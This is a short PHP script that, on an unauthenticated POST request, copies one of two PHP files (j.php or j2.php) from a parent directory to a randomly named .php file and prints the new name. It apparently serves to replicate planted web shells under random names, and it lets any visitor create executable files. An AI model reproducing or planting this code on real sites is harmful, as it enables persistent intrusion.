<?php
$make = substr(md5(mt_rand(1000,1000000000000)),0,7);
$rand = substr(md5(mt_rand(10,1000000000000000)),2,7).".php";
$combine = $make."/".$rand;
if(isset($_POST["make"])){
	switch($_POST["make"]){
		case "1":
			$filename = "j.php";
			break;
		case "2":
			$filename = "j2.php";
			break;
		default:
			exit();
	}
	$data = file_get_contents("../../".$filename);
	file_put_contents("../../".$rand,$data);
}
echo $rand;